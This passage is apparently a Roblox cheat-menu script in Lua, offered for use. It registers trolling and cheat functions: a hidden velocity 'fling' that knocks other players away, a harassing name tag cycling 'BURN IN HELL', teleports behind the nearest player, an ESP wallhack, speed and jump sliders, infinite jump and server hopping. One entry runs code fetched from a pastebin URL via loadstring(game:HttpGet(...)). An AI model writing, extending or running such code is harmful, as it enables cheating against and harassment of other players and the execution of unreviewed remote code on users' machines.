				naeeym.StudsOffset = Vector3.new(0, 2, 0)
				naeeym.Adornee = character:WaitForChild("Head")
	
				local tecks = Instance.new("TextLabel", naeeym)
				tecks.BackgroundTransparency = 1
				tecks.BorderSizePixel = 0
				tecks.Font = Enum.Font.Fantasy
				tecks.TextSize = 24
				tecks.TextStrokeTransparency = 0
				tecks.TextStrokeColor3 = Color3.new(0, 0, 0)
				tecks.TextColor3 = Color3.new(0, 0, 0)
				tecks.Size = UDim2.new(1, 0, 0.5, 0)
				tecks.Text = "John Doe"
	
				local function changeName(newName)
					tecks.Text = newName
				end
	
				local function shakeTag()
					local originalOffset = naeeym.StudsOffset
					for _ = 1, 10 do
						naeeym.StudsOffset = originalOffset + Vector3.new(math.random(-1,1), math.random(-1,1), math.random(-1,1))
						task.wait(0.05)
					end
					naeeym.StudsOffset = originalOffset
				end
	
				coroutine.wrap(function()
					while character:IsDescendantOf(workspace) do
						changeName("BURN IN HELL")
						shakeTag()
						task.wait(0.2)
						changeName("STOP")
						task.wait(0.1)
						changeName("JUST GIVE UP")
						shakeTag()
						task.wait(0.2)
						changeName("STOP")
						shakeTag()
						task.wait(0.2)
						changeName("JOHN DOE")
						shakeTag()
						task.wait(0.3)
						changeName("HOPELESS")
						shakeTag()
						task.wait(0.3)
					end
				end)()
	
				local footPartSize = Vector3.new(10, 0.5, 10)
				local floorPartColor = BrickColor.Black()
				local floorMaterial = Enum.Material.Neon
				local yOffset = -2.8
				local lastPosition = hrp.Position
				local standingTimer = 0
	
				RunService.Heartbeat:Connect(function(dt)
					if not character:IsDescendantOf(workspace) then return end
					local currentPosition = hrp.Position
					standingTimer += dt
					local distanceMoved = (currentPosition - lastPosition).Magnitude
					local stepPosition = Vector3.new(currentPosition.X, hrp.Position.Y + yOffset, currentPosition.Z)
	
					local function createFootstep(position)
						local part = Instance.new("Part")
						part.Size = footPartSize
						part.Position = position
						part.Anchored = true
						part.CanCollide = false
						part.BrickColor = floorPartColor
						part.Material = floorMaterial
						part.Transparency = 0.5
						part.Parent = workspace
						task.spawn(function()
							for i = 1, 10 do
								part.Transparency = i * 0.03
								task.wait(0.05)
							end
						end)
						Debris:AddItem(part, 1)
					end
	
					if distanceMoved > 1 then
						createFootstep(stepPosition)
						lastPosition = currentPosition
						standingTimer = 0
					elseif standingTimer > 0.5 then
						createFootstep(stepPosition)
						standingTimer = 0
					end
				end)
	
				local movel = 0.1
				local hiddenfling = true
	
				local function fling()
					while hiddenfling and character:IsDescendantOf(workspace) do
						if hrp then
							local originalVelocity = hrp.Velocity
							hrp.Velocity = originalVelocity * 10000 + Vector3.new(0, 10000, 0)
							RunService.RenderStepped:Wait()
							hrp.Velocity = originalVelocity
							RunService.Stepped:Wait()
							hrp.Velocity = originalVelocity + Vector3.new(0, movel, 0)
							movel = -movel
						end
						RunService.Heartbeat:Wait()
					end
				end
				coroutine.wrap(fling)()
			end
	
			player.CharacterAdded:Connect(setupCharacter)
			if player.Character then
				setupCharacter(player.Character)
			end
	
			local Players = game:GetService("Players")
			local UserInputService = game:GetService("UserInputService")
	
			local player = Players.LocalPlayer
			local mouse = player:GetMouse()
	
			local function teleportToMousePosition()
				local character = player.Character
				if not character or not character:FindFirstChild("HumanoidRootPart") then
					return
				end
	
				local target = mouse.Hit
				if target then
					character:MoveTo(target.Position)
				end
			end
	
			UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then return end
	
				if input.KeyCode == Enum.KeyCode.T then
					teleportToMousePosition()
				end
			end)
		end, "Trolling", "BROKEN")
		FunctionManager:register("Invis gui", function()
			loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
		end, "Trolling", "Credits to the original maker!")
		FunctionManager:register("DANCE", function()
			local anim = Instance.new("Animation")
			anim.AnimationId = "rbxassetid://27789359" 
			local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
			track:Play()
		end, "Fun", "DANCE DANCE")
		FunctionManager:register("Sound GUI", function()
			local gui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("SoundGui")
			if gui then
				gui:Destroy()
				return
			end
			local SoundGui = Instance.new("ScreenGui")
			local Frame = Instance.new("Frame")
			local AddSoundId = Instance.new("TextButton")
			local SoundIds = Instance.new("TextBox")
			local Default = Instance.new("TextButton")
			local Credits = Instance.new("TextLabel")
			local Title = Instance.new("TextLabel")
			local Swap = Instance.new("ImageButton")
			local PlayBackSpeed = Instance.new("TextBox")
			local Volume = Instance.new("TextBox")
			local Looped = Instance.new("TextBox")
			local Exit = Instance.new("ImageButton")
			local Frame2 = Instance.new("Frame")
			local Open = Instance.new("ImageButton")
			local spoky = Instance.new("Sound")
			local c00lflag = Instance.new("Sound")
			local drag = Instance.new("UIDragDetector")
			drag.Parent = Frame
			c00lflag.Name = "c00lsound23sas"
			c00lflag.Parent = Frame
			spoky.Parent = Frame
			spoky.SoundId = "rbxassetid://95156028272944"
			spoky.Volume = 3
			spoky.PlaybackSpeed = 0.2
			spoky.Name = "spoky"
			--Properties:
	
			SoundGui.Name = "SoundGui"
			SoundGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
			SoundGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			SoundGui.ResetOnSpawn = false
	
			Frame.Parent = SoundGui
			Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			Frame.BorderColor3 = Color3.fromRGB(255, 0, 4)
			Frame.BorderSizePixel = 2
			Frame.Position = UDim2.new(0, 700, 0, 300)
			Frame.Size = UDim2.new(0, 398, 0, 206)
	
			AddSoundId.Name = "AddSoundId"
			AddSoundId.Parent = Frame
			AddSoundId.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			AddSoundId.BorderColor3 = Color3.fromRGB(255, 0, 0)
			AddSoundId.BorderSizePixel = 2
			AddSoundId.Position = UDim2.new(0.118090451, 0, 0.718446612, 0)
			AddSoundId.Size = UDim2.new(0, 307, 0, 36)
			AddSoundId.Font = Enum.Font.Arial
			AddSoundId.Text = "Add Sound!"
			AddSoundId.TextColor3 = Color3.fromRGB(255, 255, 255)
			AddSoundId.TextSize = 29.000
	
			SoundIds.Name = "SoundIds"
			SoundIds.Parent = Frame
			SoundIds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			SoundIds.BorderColor3 = Color3.fromRGB(255, 0, 0)
			SoundIds.BorderSizePixel = 2
			SoundIds.Position = UDim2.new(0.118090451, 0, 0.305825233, 0)
			SoundIds.Size = UDim2.new(0, 307, 0, 33)
			SoundIds.Font = Enum.Font.Arial
			SoundIds.PlaceholderText = "Add a sound ID here!, No rbx://"
			SoundIds.Text = ""
			SoundIds.TextColor3 = Color3.fromRGB(255, 255, 255)
			SoundIds.TextScaled = true
			SoundIds.TextSize = 14.000
			SoundIds.TextWrapped = true
	
			Default.Name = "Default"
			Default.Parent = Frame
			Default.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			Default.BorderColor3 = Color3.fromRGB(255, 0, 0)
			Default.BorderSizePixel = 2
			Default.Position = UDim2.new(0.118090451, 0, 0.529126227, 0)
			Default.Size = UDim2.new(0, 307, 0, 28)
			Default.Font = Enum.Font.Arial
			Default.Text = "Spooky Scary Skeletons!"
			Default.TextColor3 = Color3.fromRGB(255, 255, 255)
			Default.TextSize = 23.000
	
			Credits.Name = "Credits"
			Credits.Parent = Frame
			Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Credits.BackgroundTransparency = 1.000
			Credits.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Credits.BorderSizePixel = 0
			Credits.Position = UDim2.new(0.577889442, 0, 0.9174757, 0)
			Credits.Size = UDim2.new(0, 153, 0, 17)
			Credits.Font = Enum.Font.SourceSans
			Credits.Text = "made by: 1known. On discord!"
			Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
			Credits.TextSize = 14.000
	
			Title.Name = "Title"
			Title.Parent = Frame
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.BorderColor3 = Color3.fromRGB(255, 0, 4)
			Title.BorderSizePixel = 2
			Title.Position = UDim2.new(0.208542719, 0, 0.0291262139, 0)
			Title.Size = UDim2.new(0, 231, 0, 48)
			Title.Font = Enum.Font.Arial
			Title.Text = "c00lSound GUI!"
			Title.TextColor3 = Color3.fromRGB(255, 255, 255)
			Title.TextSize = 33.000
			Title.TextWrapped = true
	
			Swap.Name = "Swap"
			Swap.Parent = Frame
			Swap.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			Swap.BorderColor3 = Color3.fromRGB(255, 0, 0)
			Swap.BorderSizePixel = 0
			Swap.Position = UDim2.new(0.904522598, 0, 0.33495146, 0)
			Swap.Size = UDim2.new(0, 23, 0, 21)
			Swap.Image = "rbxassetid://2500573769"
	
			PlayBackSpeed.Name = "PlayBackSpeed"
			PlayBackSpeed.Parent = Frame
			PlayBackSpeed.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			PlayBackSpeed.BorderColor3 = Color3.fromRGB(255, 0, 0)
			PlayBackSpeed.BorderSizePixel = 2
			PlayBackSpeed.Position = UDim2.new(0.118090451, 0, 0.305825233, 0)
			PlayBackSpeed.Size = UDim2.new(0, 307, 0, 33)
			PlayBackSpeed.Visible = false
			PlayBackSpeed.Font = Enum.Font.Arial
			PlayBackSpeed.PlaceholderText = "Playback speed, Enter a number!"
			PlayBackSpeed.Text = "1"
			PlayBackSpeed.TextColor3 = Color3.fromRGB(255, 255, 255)
			PlayBackSpeed.TextScaled = true
			PlayBackSpeed.TextSize = 14.000
			PlayBackSpeed.TextWrapped = true
	
			Volume.Name = "Volume"
			Volume.Parent = Frame
			Volume.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			Volume.BorderColor3 = Color3.fromRGB(255, 0, 0)
			Volume.BorderSizePixel = 2
			Volume.Position = UDim2.new(0.118090451, 0, 0.305825233, 0)
			Volume.Size = UDim2.new(0, 307, 0, 33)
			Volume.Visible = false
			Volume.Font = Enum.Font.Arial
			Volume.PlaceholderText = "Volume! Enter a number."
			Volume.Text = "0.5"
			Volume.TextColor3 = Color3.fromRGB(255, 255, 255)
			Volume.TextScaled = true
			Volume.TextSize = 14.000
			Volume.TextWrapped = true
	
			Looped.Name = "Looped"
			Looped.Parent = Frame
			Looped.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			Looped.BorderColor3 = Color3.fromRGB(255, 0, 0)
			Looped.BorderSizePixel = 2
			Looped.Position = UDim2.new(0.118090451, 0, 0.305825233, 0)
			Looped.Size = UDim2.new(0, 307, 0, 33)
			Looped.Visible = false
			Looped.Font = Enum.Font.Arial
			Looped.PlaceholderText = "Is it looped?, Type: False or True"
			Looped.Text = "False"
			Looped.TextColor3 = Color3.fromRGB(255, 255, 255)
			Looped.TextScaled = true
			Looped.TextSize = 14.000
			Looped.TextWrapped = true
	
			Exit.Name = "Exit"
			Exit.Parent = Frame
			Exit.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			Exit.BorderColor3 = Color3.fromRGB(255, 0, 0)
			Exit.BorderSizePixel = 2
			Exit.Position = UDim2.new(0.921999991, 0, 0.0289999992, 0)
			Exit.Size = UDim2.new(0, 25, 0, 23)
			Exit.Image = "rbxassetid://14930908086"
	
			Frame2.Name = "Frame2"
			Frame2.Parent = SoundGui
			Frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Frame2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Frame2.BorderSizePixel = 0
			Frame2.Position = UDim2.new(0.984443069, 0, 0.841666639, 0)
			Frame2.Size = UDim2.new(0, 25, 0, 23)
			Frame2.Visible = false
	
			Open.Name = "Open"
			Open.Parent = Frame2
			Open.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			Open.BorderColor3 = Color3.fromRGB(255, 0, 0)
			Open.BorderSizePixel = 2
			Open.Position = UDim2.new(-0.0312646478, 0, -0.0113339629, 0)
			Open.Size = UDim2.new(0, 25, 0, 23)
			Open.Image = "rbxassetid://14930908086"
	
			-- Scripts:
	
			local function GSSVM_fake_script() -- AddSoundId.LocalScript 
				local script = Instance.new('LocalScript', AddSoundId)
	
				local parent = script.Parent
	
				parent.Activated:Connect(function()
					local SoundId = parent.Parent:WaitForChild("SoundIds").Text
					local Playbackspeed = parent.Parent:WaitForChild("PlayBackSpeed").Text
					local Volume = parent.Parent:WaitForChild("Volume").Text
					local looped = parent.Parent:WaitForChild("Looped").Text
					if SoundId == "" then
						parent.Text = "No Sound ID!"
						wait(2)
						parent.Text = "Add Sound!"
						return
					end
	
					local id = "rbxassetid://" .. SoundId
					local speed = tonumber(Playbackspeed) or 1
					local existingSound = game.Workspace:FindFirstChild("c00lsound23sas")
	
					if existingSound then
						existingSound.SoundId = id
						existingSound.PlaybackSpeed = speed
						existingSound.Volume = Volume
						if looped == "False" then
							existingSound.Looped = false
						elseif looped == "True"	then
							existingSound.Looped = true
						else
							existingSound.Looped = false
						end
						existingSound:Play()
					else
						local clonedSound = parent.Parent.c00lsound23sas:Clone()
						clonedSound.Parent = game.Workspace
						clonedSound.SoundId = id
						clonedSound.PlaybackSpeed = speed
						clonedSound.Volume = Volume
						if looped == "False" then
							clonedSound.Looped = false
						elseif looped == "True"	then
							clonedSound.Looped = true
						else
							clonedSound.Looped = false
						end
						clonedSound.Looped = looped
	
						clonedSound:Play()
					end
	
					parent.Text = "Injected Sound Succesfully!, Be sure to enter a correct ID if it doesnt work!"
					parent.TextScaled = true
					wait(3.5)
					parent.TextScaled = false
					parent.Text = "Add Sound!"
				end)
	
			end
			coroutine.wrap(GSSVM_fake_script)()
			local function MWUVEW_fake_script() -- Default.LocalScript 
				local script = Instance.new('LocalScript', Default)
	
				local parent = script.Parent
				local sound = parent.Parent.spoky
	
				parent.Activated:Connect(function()
					if sound.Playing == true then
						sound.Playing = false
					else
						sound.Playing = true
					end
				end)
			end
			coroutine.wrap(MWUVEW_fake_script)()
			local function BIKZQ_fake_script() -- Swap.LocalScript 
				local script = Instance.new('LocalScript', Swap)
	
				local parent = script.Parent
				local playback = parent.Parent.PlayBackSpeed
				local Sound = parent.Parent.SoundIds
				local volume = parent.Parent.Volume
				local looped = parent.Parent.Looped
				parent.Activated:Connect(function()
					if Sound.Visible == true then
						Sound.Visible = false
						playback.Visible = true
						volume.Visible = false
						looped.Visible = false
	
					elseif playback.Visible ==true then
						playback.Visible = false
						Sound.Visible = false
						volume.Visible = true
						looped.Visible = false
	
					elseif volume.Visible == true then
						Sound.Visible = false
						playback.Visible = false
						volume.Visible = false
						looped.Visible = true
					elseif looped.Visible == true then
						Sound.Visible = true
						playback.Visible = false
						volume.Visible = false
						looped.Visible = false
					end
				end)
			end
			coroutine.wrap(BIKZQ_fake_script)()
			local function AXYPXC_fake_script() -- Exit.LocalScript 
				local script = Instance.new('LocalScript', Exit)
	
				local parent = script.Parent
				local main = parent.Parent
	
				parent.Activated:Connect(function()
					main.Parent.Frame2.Visible = true
					main.Visible = false
	
				end)
			end
			coroutine.wrap(AXYPXC_fake_script)()
			local function WHTXC_fake_script() -- Open.LocalScript 
				local script = Instance.new('LocalScript', Open)
	
				local parent = script.Parent
				local main = parent.Parent.Parent.Frame
	
				parent.Activated:Connect(function()
					main.Visible = true
					parent.Parent.Visible = false
				end)
			end
			coroutine.wrap(WHTXC_fake_script)()
		end, "General", "NOT FE")
		FunctionManager:register("Bind Key", function()
			if bindFrame then return end 
	
			local gui = Player:FindFirstChild("PlayerGui"):FindFirstChild(die)
			if not gui then NotifyERROR("Gui not found!"); return end
			screenGui = gui
	
			bindFrame = Instance.new("Frame")
			bindFrame.Name = generate_string(math_random(1, 10))
			bindFrame.Size = UDim2.new(1,0,1,0)
			bindFrame.BackgroundColor3 = Color3.new(0,0,0)
			bindFrame.BackgroundTransparency = 0.5
			bindFrame.ZIndex = 50
			bindFrame.Parent = screenGui
	
			local panel = Instance.new("Frame")
			panel.Name = generate_string(math_random(1, 10))
			panel.Size = UDim2.new(0, 300, 0, 400)
			panel.Position = UDim2.new(0.5, -150, 0.5, -200)
			panel.BackgroundColor3 = Color3.fromRGB(35,35,35)
			panel.BorderSizePixel = 0
			panel.ZIndex = 51
			panel.Parent = bindFrame
	
			local closeBtn = Instance.new("TextButton")
			closeBtn.Size = UDim2.new(0, 60, 0, 24)
			closeBtn.Position = UDim2.new(1, -64, 0, 4)
			closeBtn.Text = "Close"
			closeBtn.Font = Enum.Font.SourceSansBold
			closeBtn.TextSize = 14
			closeBtn.BackgroundColor3 = Color3.fromRGB(150,50,50)
			closeBtn.TextColor3 = Color3.new(1,1,1)
			closeBtn.ZIndex = 52
			closeBtn.Parent = panel
			closeBtn.MouseButton1Click:Connect(function()
				bindFrame:Destroy()
				bindFrame = nil
				if bindConn then bindConn:Disconnect(); bindConn = nil end
			end)
	
			local title = Instance.new("TextLabel")
			title.Size = UDim2.new(1, -8, 0, 24)
			title.Position = UDim2.new(0, 4, 0, 4)
			title.BackgroundTransparency = 1
			title.Font = Enum.Font.SourceSansBold
			title.TextSize = 18
			title.TextColor3 = Color3.new(1,1,1)
			title.Text = "Bind Key to Function"
			title.ZIndex = 52
			title.Parent = panel
	
			local list = Instance.new("ScrollingFrame")
			list.Size = UDim2.new(1, -8, 1, -40)
			list.Position = UDim2.new(0, 4, 0, 32)
			list.CanvasSize = UDim2.new(0,0,0,0)
			list.ScrollBarThickness = 6
			list.ZIndex = 51
			list.Parent = panel
	
			local uiList = Instance.new("UIListLayout")
			uiList.Padding = UDim.new(0,4)
			uiList.SortOrder = Enum.SortOrder.LayoutOrder
			uiList.Parent = list
	
			local function refreshList()
				for _, child in ipairs(list:GetChildren()) do
					if child:IsA("TextButton") or child:IsA("TextLabel") then
						child:Destroy()
					end
				end
	
				for _, cat in ipairs(FunctionManager.Categories) do
					local hdr = Instance.new("TextLabel")
					hdr.Size = UDim2.new(1,0,0,24)
					hdr.BackgroundTransparency = 1
					hdr.Font = Enum.Font.SourceSansBold
					hdr.TextSize = 16
					hdr.TextColor3 = Color3.new(1,1,0)
					hdr.Text = "["..cat.."]"
					hdr.ZIndex = 51
					hdr.Parent = list
	
					for name, cb in pairs(FunctionManager:getFunctionsInCategory(cat)) do
						local btn = Instance.new("TextButton")
						btn.Size = UDim2.new(1,0,0,24)
						btn.Font = Enum.Font.SourceSans
						btn.TextSize = 14
						btn.BackgroundColor3 = Color3.fromRGB(50,50,50)
						btn.TextColor3 = Color3.new(1,1,1)
						btn.ZIndex = 51
	
						local bound = {}
						for key, fn in pairs(customBinds) do
							if fn == cb then table.insert(bound, tostring(key)) end
						end
						local suffix = #bound>0 and " ("..table.concat(bound, ",")..")" or ""
						btn.Text = name..suffix
						btn.Parent = list
	
						btn.MouseButton1Click:Connect(function()
							waitingBindFunction = { cb = cb, btn = btn, name = name }
							btn.Text = name.." → [Press a key]"
						end)
					end
				end
	
				list.CanvasSize = UDim2.new(0,0,0, uiList.AbsoluteContentSize.Y + 8)
			end
			bindConn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed or not waitingBindFunction then return end
				if input.UserInputType == Enum.UserInputType.Keyboard then
					customBinds[input.KeyCode] = waitingBindFunction.cb
					waitingBindFunction.btn.Text = waitingBindFunction.name.." ("..tostring(input.KeyCode)..")"
					waitingBindFunction = nil
				end
			end)
			refreshList()
	
		end, "Utility", "BUGGED")
		UserInputService.InputBegan:Connect(function(input, gameProcessed)
			if gameProcessed then return end
			if input.UserInputType == Enum.UserInputType.Keyboard then
				local fn = customBinds[input.KeyCode]
				if fn and type(fn) == "function" then
					pcall(fn)
				end
			end
		end)
		FunctionManager:register("JumpUp", function()
			local char = Player.Character
			local hrp = char and char:FindFirstChild("HumanoidRootPart")
			if hrp then hrp.Velocity = Vector3.new(0, 100, 0) end
		end, "Movement", "Leap into the air!")
	
	
		FunctionManager:register("Sit", function()
			local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
			if hum then hum.Sit = true end
		end, "Movement", "SIT DOWN")
	
	
		FunctionManager:register("INF JUMP", function()
			infJumpEnabled = not infJumpEnabled
	
			if infJumpEnabled then
				local debounce = false
	
				infJumpConnection = UserInputService.JumpRequest:Connect(function()
					if debounce then return end
					debounce = true
	
					local character = Player.Character
					local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
					if humanoid then
						humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
					end
	
					task.wait()
					debounce = false
				end)
			else
				if infJumpConnection then
					infJumpConnection:Disconnect()
					infJumpConnection = nil
				end
			end
		end, "Movement", "Jump Forever!")
	
		FunctionManager:register("WalkSpeed Slider", function()
			if screenGui:FindFirstChild("WalkSpeedModal") then return end
	
	
			local overlay = Instance.new("Frame")
			overlay.Name               = "WalkSpeedModal"
			overlay.Size               = UDim2.new(1,0,1,0)
			overlay.Position           = UDim2.new(0,0,0,0)
			overlay.BackgroundColor3   = Color3.new(0,0,0)
			overlay.BackgroundTransparency = 0.5
			overlay.ZIndex             = 50
			overlay.Parent             = screenGui
	
			local panel = Instance.new("Frame")
			panel.Name                  = "SliderPanel"
			panel.Size                  = UDim2.new(0, 300, 0, 100)
			panel.Position              = UDim2.new(0.5, -150, 0.5, -50)
			panel.BackgroundColor3      = Color3.fromRGB(40,40,40)
			panel.BorderSizePixel       = 0
			panel.ZIndex                = 51
			panel.Parent                = overlay
	
			local closeBtn = Instance.new("TextButton")
			closeBtn.Name               = "Close"
			closeBtn.Size               = UDim2.new(0,60,0,24)
			closeBtn.Position           = UDim2.new(1,-64,0,4)
			closeBtn.Font               = Enum.Font.SourceSansBold
			closeBtn.TextSize           = 14
			closeBtn.Text               = "Close"
			closeBtn.BackgroundColor3   = Color3.fromRGB(150,50,50)
			closeBtn.TextColor3         = Color3.new(1,1,1)
			closeBtn.ZIndex             = 52
			closeBtn.Parent             = panel
			closeBtn.MouseButton1Click:Connect(function()
				overlay:Destroy()
			end)
	
			local label = Instance.new("TextLabel")
			label.Name                  = "ValueLabel"
			label.Size                  = UDim2.new(1,-8,0,24)
			label.Position              = UDim2.new(0,4,0,4)
			label.BackgroundTransparency= 1
			label.Font                  = Enum.Font.SourceSansBold
			label.TextSize              = 18
			label.TextColor3            = Color3.new(1,1,1)
			label.Text                  = "WalkSpeed: " .. tostring(Humanoid.WalkSpeed)
			label.ZIndex                = 52
			label.Parent                = panel
	
			local track = Instance.new("Frame")
			track.Name                  = "Track"
			track.Size                  = UDim2.new(1,-16,0,20)
			track.Position              = UDim2.new(0,8,0,40)
			track.BackgroundColor3      = Color3.fromRGB(60,60,60)
			track.BorderSizePixel       = 0
			track.ZIndex                = 51
			track.Parent                = panel
	
			local fill = Instance.new("Frame")
			fill.Name                   = "Fill"
			fill.Size                   = UDim2.new(
				math.clamp((Humanoid.WalkSpeed - 8)/(100-8),0,1), 0,
				1, 0
			)
			fill.BackgroundColor3       = Color3.fromRGB(100,200,100)
			fill.BorderSizePixel        = 0
			fill.ZIndex                 = 52
			fill.Parent                 = track
	
			local dragging = false
			local minS, maxS = 8, 100
	
			local function update(x)
				local rel = math.clamp((x - track.AbsolutePosition.X)/track.AbsoluteSize.X, 0,1)
				local v = math.floor(minS + (maxS-minS)*rel)
				Humanoid.WalkSpeed = v
				label.Text = "WalkSpeed: "..v
				fill.Size = UDim2.new(rel,0,1,0)
			end
	
			track.InputBegan:Connect(function(i)
				if i.UserInputType == Enum.UserInputType.MouseButton1 then
					dragging = true
					update(i.Position.X)
				end
			end)
			track.InputEnded:Connect(function(i)
				if i.UserInputType == Enum.UserInputType.MouseButton1 then
					dragging = false
				end
			end)
			UserInputService.InputChanged:Connect(function(i)
				if dragging and i.UserInputType==Enum.UserInputType.MouseMovement then
					update(i.Position.X)
				end
			end)
		end, "Movement", "Control your walkspeed!")
	
	
	
		FunctionManager:register("Server Hop", function()
			local success, res = pcall(function()
				return game:HttpGet(
					"https://games.roblox.com/v1/games/" ..
						PlaceId ..
						"/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"
				)
			end)
	
			if not success then
				return NotifyERROR("[Server Hop] HTTP request failed")
			end
	
			local body
			local ok, err = pcall(function()
				body = HttpService:JSONDecode(res)
			end)
			if not ok or type(body) ~= "table" or type(body.data) ~= "table" then
				return NotifyERROR("[Server Hop] Invalid JSON response")
			end
	
			local servers = {}
			for _, v in ipairs(body.data) do
				if type(v) == "table"
					and tonumber(v.playing)
					and tonumber(v.maxPlayers)
					and v.playing < v.maxPlayers
					and v.id ~= JobId then
					table.insert(servers, v.id)
				end
			end
	
			if #servers == 0 then
				return NotifyERROR("[Server Hop] No available servers found")
			end
	
			local choice = servers[math.random(1, #servers)]
			TeleportService:TeleportToPlaceInstance(PlaceId, choice, Players.LocalPlayer)
		end, "Utility","Changes Servers")
	
		FunctionManager:register("TP Behind Closest", function()
	
			if not  HRP then
				NotifyERROR("No HumanoidRootPart found.")
				return
			end
	
			local closestPlayer
			local shortestDistance = math.huge
	
	
			for _, otherPlayer in ipairs(Players:GetPlayers()) do
				if otherPlayer ~= Player and otherPlayer.Character then
					local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
					if otherRoot then
						local distance = (otherRoot.Position - HRP.Position).Magnitude
						if distance < shortestDistance then
							shortestDistance = distance
							closestPlayer = otherPlayer
						end
					end
				end
			end
	
			if closestPlayer and closestPlayer.Character then
				local targetRoot = closestPlayer.Character:FindFirstChild("HumanoidRootPart")
				if targetRoot then
					local behindPosition = targetRoot.CFrame.Position - targetRoot.CFrame.LookVector * 3
					local newCFrame = CFrame.new(behindPosition, targetRoot.Position) 
					HRP.CFrame = newCFrame
				end
			else
				NotifyERROR("No nearby player found.")
			end
		end, "Movement", "Owai moi, shinderu. NANI?")
		FunctionManager:register("Scare Closest Player", function()
	
			if not HRP then
				NotifyERROR("Could not find your HumanoidRootPart.")
				return
			end
	
			local closestPlayer, closestDistance = nil, math.huge
			for _, otherPlayer in ipairs(Players:GetPlayers()) do
				if otherPlayer ~= Player and otherPlayer.Character then
					local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
					if otherRoot then
						local dist = (otherRoot.Position - HRP.Position).Magnitude
						if dist < closestDistance then
							closestDistance = dist
							closestPlayer = otherPlayer
						end
					end
				end
			end
	
			if closestPlayer and closestPlayer.Character then
				local targetRoot = closestPlayer.Character:FindFirstChild("HumanoidRootPart")
				if targetRoot then
					local oldPos = HRP.CFrame
					HRP.CFrame = targetRoot.CFrame + targetRoot.CFrame.lookVector * 2
					HRP.CFrame = CFrame.new(HRP.Position, targetRoot.Position)
					task.wait(0.5)
					HRP.CFrame = oldPos
				end
			else
				NotifyERROR("No target player nearby.")
			end
		end, "Fun", "FNAF reference")
		FunctionManager:register("ESP Toggle", function()
			espOn = not espOn
			for _, plr in ipairs(Players:GetPlayers()) do
				if plr.Character and plr ~= Player then
					local head = plr.Character:FindFirstChild("Head")
					if head then
						local bb = head:FindFirstChild("ESP") or Instance.new("BillboardGui", head)
						bb.Name = "ESP"
						bb.Size = UDim2.new(0,80,0,20)
						bb.AlwaysOnTop = true
						local lbl = bb:FindFirstChild("Name") or Instance.new("TextLabel", bb)
						lbl.Name = "Name"
						lbl.BackgroundTransparency = 1
						lbl.Size = UDim2.new(1,0,1,0)
						lbl.TextColor3 = Color3.new(1,0,0)
						lbl.TextScaled = true
						lbl.Text = plr.Name
						bb.Enabled = espOn
					end
				end
			end
			Notify("ESP " .. (espOn and "Enabled" or "Disabled"), "SYSTEM", 3)
		end, "Visual", "ur cooked i just got wallhacks")
		FunctionManager:register("JumpPowerSlider", function()
			if screenGui:FindFirstChild("JumpPowerModal") then return end
			Humanoid.UseJumpPower = true
			local overlay = Instance.new("Frame")
			overlay.Name               = "JumpPowerModal"
			overlay.Size               = UDim2.new(1,0,1,0)
			overlay.Position           = UDim2.new(0,0,0,0)
			overlay.BackgroundColor3   = Color3.new(0,0,0)
			overlay.BackgroundTransparency = 0.5
			overlay.ZIndex             = 50
			overlay.Parent             = screenGui
	
	
			local panel = Instance.new("Frame")
			panel.Name                  = "JumpPanel"
			panel.Size                  = UDim2.new(0, 300, 0, 100)
			panel.Position              = UDim2.new(0.5, -150, 0.5, -50)
			panel.BackgroundColor3      = Color3.fromRGB(40,40,40)
			panel.BorderSizePixel       = 0
			panel.ZIndex                = 51
			panel.Parent                = overlay
	
	
			local closeBtn = Instance.new("TextButton")
			closeBtn.Name               = "Close"
			closeBtn.Size               = UDim2.new(0,60,0,24)
			closeBtn.Position           = UDim2.new(1,-64,0,4)
			closeBtn.Font               = Enum.Font.SourceSansBold
			closeBtn.TextSize           = 14
			closeBtn.Text               = "Close"
			closeBtn.BackgroundColor3   = Color3.fromRGB(150,50,50)
			closeBtn.TextColor3         = Color3.new(1,1,1)
			closeBtn.ZIndex             = 52
			closeBtn.Parent             = panel
			closeBtn.MouseButton1Click:Connect(function()
				overlay:Destroy()
			end)
	
	
			local label = Instance.new("TextLabel")
			label.Name                  = "ValueLabel"
			label.Size                  = UDim2.new(1,-8,0,24)
			label.Position              = UDim2.new(0,4,0,4)
			label.BackgroundTransparency= 1
			label.Font                  = Enum.Font.SourceSansBold
			label.TextSize              = 18
			label.TextColor3            = Color3.new(1,1,1)
			label.Text                  = "JumpPower: " .. tostring(Humanoid.JumpPower)
			label.ZIndex                = 52
			label.Parent                = panel
	
	
			local track = Instance.new("Frame")
			track.Name                  = "Track"
			track.Size                  = UDim2.new(1,-16,0,20)
			track.Position              = UDim2.new(0,8,0,40)
			track.BackgroundColor3      = Color3.fromRGB(60,60,60)
			track.BorderSizePixel       = 0
			track.ZIndex                = 51
			track.Parent                = panel
	
			local fill = Instance.new("Frame")
			fill.Name                   = "Fill"
			fill.Size                   = UDim2.new(
